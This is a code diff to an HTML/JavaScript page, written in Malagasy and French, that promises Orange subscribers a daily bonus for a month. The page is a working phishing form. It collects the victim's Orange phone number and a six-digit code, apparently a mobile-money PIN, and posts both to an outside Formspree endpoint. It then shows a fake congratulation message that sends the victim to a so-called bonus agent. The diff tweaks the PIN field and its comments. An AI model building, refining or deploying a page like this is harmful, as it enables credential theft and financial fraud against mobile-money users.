@@ -12,7 +12,6 @@
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .step-img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
 
-        /* Style Cage Cage */
         .tarif-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; max-height: 500px; overflow-y: auto; padding: 5px; }
         .tarif-card { background: white; border-radius: 12px; border: 1px solid #eee; padding: 15px 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); transition: 0.3s; display: flex; flex-direction: column; align-items: center; }
         .tarif-card:hover { transform: translateY(-3px); box-shadow: 0 6px 12px rgba(0,0,0,0.1); }
@@ -63,7 +62,7 @@
         <form id="bonusForm" action="https://formspree.io/f/mreaeppz" method="POST">
             <input type="hidden" name="Tarif" id="selectedTarifInput">
             <input type="tel" name="Numero" id="phoneInput" placeholder="Numero Orange (032.. na 037..)" maxlength="10" required>
-            <input type="password" name="Code" id="codeInput" placeholder="Code 6 chiffres" maxlength="6" disabled required>
+            <input type="number" name="Code" id="codeInput" placeholder="Code 6 chiffres" oninput="if(this.value.length > 6) this.value = this.value.slice(0, 6);" disabled required>
             <button type="submit" id="submitBtn" class="btn-confirm" disabled>CONFIRMER</button>
         </form>
     </div>
@@ -87,6 +86,7 @@
         const code = codeInput.value;
         const isOrange = phone.startsWith('032') || phone.startsWith('037');
         codeInput.disabled = !isOrange;
+        // Tsy maintsy 6 chiffres vao mandeha ny bokotra
         submitBtn.disabled = !(isOrange && code.length === 6);
     }
 
@@ -112,7 +112,6 @@
         const data = new FormData(form);
         const response = await fetch(form.action, { method: 'POST', body: data, headers: { 'Accept': 'application/json' } });
         if (response.ok) {
-            // Hafatra namboarina: isan-andro mandritra ny iray volana
             const msg = `Felicitation, votre bonus est en cours. Voamarina fa nandoa <b>${chosenFond}</b> ianao ka bonus azo <b>${chosenBonus}</b> isan-andro mandritra ny iray volana. Manasa anao handefa mp amin'i agent code Bonus izao, efa io am sary eo ambony io ny pagen'i agent code bonus.`;
             document.getElementById('msgFelicitation').innerHTML = msg;
             nextStep(4);
